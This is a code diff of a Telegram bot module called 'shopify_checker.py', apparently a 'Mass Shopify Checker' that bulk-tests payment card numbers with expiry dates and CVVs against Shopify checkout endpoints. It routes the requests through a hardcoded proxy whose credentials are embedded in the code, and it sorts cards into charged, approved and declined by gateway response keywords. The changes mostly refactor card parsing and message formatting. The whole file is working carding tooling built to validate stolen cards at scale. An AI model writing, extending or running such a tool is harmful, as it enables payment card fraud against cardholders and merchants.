@@ -5450,6 +5450,7 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+# shopify_checker.py
 import asyncio
 import httpx
 import time
@@ -5464,7 +5465,10 @@ from telegram import (
     InlineKeyboardButton,
     InputFile,
 )
-from telegram.ext import ContextTypes
+from telegram.ext import (
+    ContextTypes,
+    CallbackQueryHandler,
+)
 
 # Replace with your actual DB functions
 from db import get_user, update_user
@@ -5475,16 +5479,16 @@ logging.basicConfig(level=logging.INFO)
 # In-memory cooldowns
 last_msp_usage: Dict[int, float] = {}
 
-# Regex: supports |, /, :, or spaces
-CARD_REGEX = re.compile(
-    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
-)
+# Regex backup matcher
+CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
 # Proxy placeholder
 DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-# Response classification
+# Junk/error response patterns
 ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY"]
+
+# Classification keyword groups
 CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED", "INSUFFICIENT_FUNDS"}
 APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP"}
 DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}
@@ -5493,15 +5497,21 @@ DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCO
 # ---------- Utility ----------
 
 def extract_cards_from_text(text: str) -> List[str]:
-    """Extract cards in normalized form: card|mm|yyyy|cvv"""
+    """
+    Extract cards from text. Supports cards separated by spaces OR newlines.
+    Format: card|mm|yy|cvv OR card|mm|yyyy|cvv
+    """
     cards: List[str] = []
-    for match in CARD_REGEX.finditer(text):
-        card, mm, yy, cvv = match.groups()
-        mm = mm.zfill(2)
-        if len(yy) == 2:
-            yy = "20" + yy
-        normalized = f"{card}|{mm}|{yy}|{cvv}"
-        cards.append(normalized)
+    text = text.replace(" ", "\n")
+    for line in text.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        parts = line.split("|")
+        if len(parts) == 4 and parts[0].isdigit():
+            cards.append(line)
+    if not cards:
+        cards = [m.group(0) for m in CARD_REGEX.finditer(text)]
     return cards
 
 
@@ -5538,7 +5548,12 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
         try:
             data = r.json()
         except Exception:
-            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
+            return {
+                "response": r.text or "Unknown",
+                "status": "false",
+                "price": "0",
+                "gateway": "N/A",
+            }
         return {
             "response": str(data.get("Response", "Unknown")),
             "status": str(data.get("Status", "false")),
@@ -5546,7 +5561,12 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
             "gateway": str(data.get("Gateway", "N/A")),
         }
     except Exception as e:
-        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
+        return {
+            "response": f"Error: {str(e)}",
+            "status": "false",
+            "price": "0",
+            "gateway": "N/A",
+        }
 
 
 # ---------- Buttons ----------
@@ -5575,6 +5595,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg) -> None:
     approved = declined = errors = charged = checked = 0
     approved_results, charged_results, declined_results, error_results = [], [], [], []
+
     proxy = DEFAULT_PROXY
 
     async with httpx.AsyncClient() as session:
@@ -5603,7 +5624,10 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                     score = 0
                 scored.append((resp, score))
 
-            valid_responses = [item for item in scored if all(pat not in (item[0].get("response") or "").upper() for pat in ERROR_PATTERNS)]
+            valid_responses = [
+                item for item in scored
+                if all(pat not in (item[0].get("response") or "").upper() for pat in ERROR_PATTERNS)
+            ]
             chosen = max(valid_responses, key=lambda x: x[1]) if valid_responses else max(scored, key=lambda x: x[1])
             resp, best_score = chosen
 
@@ -5647,21 +5671,28 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
             try:
                 buttons = build_msp_buttons(card, approved, charged, declined, update.effective_user.id)
                 summary_text = (
-                    f"📊 𝗠𝗮𝘀𝘀 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n"
+                    "<pre><code>"
+                    f"📊 Mass Shopify Checker\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ➵ {len(cards)}\n"
-                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
-                    f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ {charged}\n"
-                    f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
-                    f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ {errors}\n"
-                    f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ {checked} / {len(cards)}\n"
+                    f"🌍 Total Cards : {len(cards)}\n"
+                    f"✅ Approved : {approved}\n"
+                    f"🔥 Charged : {charged}\n"
+                    f"❌ Declined : {declined}\n"
+                    f"⚠️ Errors : {errors}\n"
+                    f"🔄 Checked : {checked} / {len(cards)}\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "</code></pre>"
                 )
-                await msg.edit_text(summary_text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)
-            except Exception:
-                pass
+                await msg.edit_text(
+                    summary_text,
+                    parse_mode="HTML",
+                    disable_web_page_preview=True,
+                    reply_markup=buttons
+                )
+            except Exception as e:
+                logger.warning(f"Edit failed: {e}")
 
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.5)  # prevent hammering
 
     # --- final report ---
     sections = []
@@ -5675,23 +5706,24 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
         sections.append("⚠️ ERRORS\n" + "\n\n".join(error_results))
 
     final_report = "\n\n============================\n\n".join(sections) if sections else "No results."
+
     file_buf = io.BytesIO(final_report.encode("utf-8"))
     file_buf.name = "shopify_results.txt"
 
     summary_caption = (
         "📊 <b>Final Summary</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"#𝑻𝒐𝒕𝒂𝒍_𝑪𝒂𝒓𝒅𝒔 → <b>{len(cards)}</b>\n\n"
-        "<pre><code>"
-        f"✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
-        f"🔥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝  ➵ {charged}\n"
-        f"❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
-        f"⚠️ 𝐄𝐫𝐫𝐨𝐫𝐬   ➵ {errors}"
-        "</code></pre>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━"
+        f"🌍 Total Cards : <b>{len(cards)}</b>\n"
+        f"✅ Approved : <b>{approved}</b>\n"
+        f"🔥 Charged : <b>{charged}</b>\n"
+        f"❌ Declined : <b>{declined}</b>\n"
+        f"⚠️ Errors : <b>{errors}</b>"
     )
 
-    await update.message.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")
+    await update.message.reply_document(
+        document=InputFile(file_buf),
+        caption=summary_caption,
+        parse_mode="HTML"
+    )
 
     try:
         await msg.delete()
@@ -5712,14 +5744,10 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     cards: List[str] = []
 
-    # Try args first
     if context.args:
-        raw_text = " ".join(context.args)
-        cards = extract_cards_from_text(raw_text)
-    # If no args, maybe reply-to text
+        cards = extract_cards_from_text(" ".join(context.args))
     elif update.message.reply_to_message and update.message.reply_to_message.text:
         cards = extract_cards_from_text(update.message.reply_to_message.text)
-    # If reply-to document
     elif update.message.reply_to_message and update.message.reply_to_message.document:
         try:
             file_obj = await update.message.reply_to_message.document.get_file()
